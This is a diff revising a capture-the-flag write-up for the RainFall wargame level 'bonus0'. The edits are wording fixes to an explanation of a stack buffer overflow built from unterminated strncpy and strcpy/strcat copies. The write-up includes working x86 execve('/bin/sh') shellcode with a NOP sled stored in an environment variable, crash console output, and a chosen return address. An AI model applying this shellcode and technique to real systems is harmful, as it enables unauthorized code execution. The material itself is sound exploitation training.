@@ -104,12 +104,12 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-Notice here the call to a 4096 bytes long `read`, followed by the usage of the first 20th characters read only. `strncpy` seems to protect the copy but we should probably investigate on this part of the code too.
+Notice here the call to a 4096 bytes long `read`, followed by the usage of the only first 20th characters read. `strncpy` seems to protect the copy but we should probably investigate on this part of the code too.
 
 > Note : In order to be as explicit as possible, we will use the following terms to distinguish the different buffers used in the program :
 - main buffer : 42 byte long, declared in the `main`, and filled in `pp` function.
 - middle buffer 1 and 2 : 20 byte long, declared in `pp` function, sent to `p` to be filled, then copied to the main buffer
-- read buffer : 4096 byte long, declared in `p` function, filled by a call to `read` and then copied into one of the middle buffers. 
+- read buffer : 4096 byte long, declared in `p` function, filled by a call to `read` and then copied into one of the middle buffers.
 
 Since the program waits twice for an user input and stores the result in the two middle buffers, we try to send 20+ characters on both `read` calls and a crash occurs. From here, we try to understand why.
 
@@ -124,7 +124,7 @@ Thanks to the vulnerabilities found in the code, it is pretty obvious than we ca
 
 ## Exploit
 
-Since we know that the middle buffers are contiguous on the stack (looking at their addresses), we expect to copy both on the main buffer with the `strcpy` call thanks to the missing '\0' at the end of the first middle buffer. This way we will almost fill the whole buffer, and then use the `strcat` call to oveflow the buffer and reach the return address.
+Since we know that the middle buffers are contiguous on the stack (looking at their addresses), we expect to copy both on the main buffer with the `strcpy` call thanks to the missing '\0' at the end of the first middle buffer. This way we will almost fill the whole main buffer, and then use the `strcat` call to oveflow it and reach the return address.
 
 Normal behaviour : the main buffer is filled with our input + the 'space' character added in `pp` + the terminating '\0' appended by `strcat`.
 ```console
@@ -136,11 +136,11 @@ FFFFGGGGHHHHIIIIJJJ
 AAAABBBBCCCCDDDDEEE FFFFGGGGHHHHIIIIJJJ
 ```
 
-Overflow test : the main buffer is filled with our input which does not include any '\0' so `strcpy` copies the two middle buffers, the 'space' is inserted, then `strcat` append a new occurence of the 2nd middle buffer
+Overflow test : the main buffer is filled with our input which does not include any '\0' so `strcpy` copies the two middle buffers, the 'space' is inserted when a '\0' is encountered, then `strcat` append a new occurence of the 2nd middle buffer
 ```console
 bonus0@RainFall:~$ ./bonus0
  -
-AAAABBBBCCCCDDDDEEEE
+AAAABBBBCCCCDDDDEEEE    # +1 'E' character here
  -
 FFFFGGGGHHHHIIIIJJJJ
 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ�� FFFFGGGGHHHHIIIIJJJJ��
@@ -149,9 +149,9 @@ Segmentation fault (core dumped)
 
 As usual, we use a buffer overflow eip string generator to find the good offset to reach the `main` return address. This offset is after the ninth character of the second string (middle buffer 2).
 
-The only thing we need now is an address where we can jump and execute some code to spawn a shell. Due to the lack of space in the buffer, we will jump elsewhere on the stack. The environment is a good place to store our shellcode, since it is sent to any program via the third argument of `main`, so it is put on the stack.
+The only thing we need now is an address where we can jump and execute some code to spawn a shell. Due to the lack of space in the buffer, we will jump elsewhere on the stack. The environment is a good place to store our shellcode, since it is sent to any program via the third argument of `main`, so it is pushed on the stack.
 
-We use the same shellcode as in the level2, which run `execve("/bin/sh", ["/bin/sh"], NULL)` and assign it to an environment variable. We add a NOP sled to create a large range of address where we can jump into.
+We write the same shellcode as in the level2, which run `execve("/bin/sh", ["/bin/sh"], NULL)` and assign it to an environment variable. We add a NOP sled to create a large range of address where we can jump into.
 
 ```console
 bonus0@RainFall:~$ export SHELLCODE=`python -c 'print "\x90"*50 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
@@ -200,7 +200,7 @@ EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflo
 [------------------------------------------------------------------------------]
 ```
 
-Our variable is stored at the address `0xbffff8ab`, we add something like 30 to jump over the beginning, especially the "SHELLCODE=" part and land into the NOP sled. Let's use the address `0xbffff8c9`.
+Our variable is stored at the address `0xbffff8ab`, we add something like 30 to jump over the beginning, especially the "SHELLCODE=" characters and land into the NOP sled. Let's use the address `0xbffff8c9`.
 
 We can now prepare our final string. Note that we will send the whole string to the standard input of the executable, but we need `read` to get it in two parts to fill the two middle buffers. So we will first send 4096 characters, including a terminating '\n', then 9 characters for the address offset + the address (4 bytes) + 7 characters to reach 20.
 
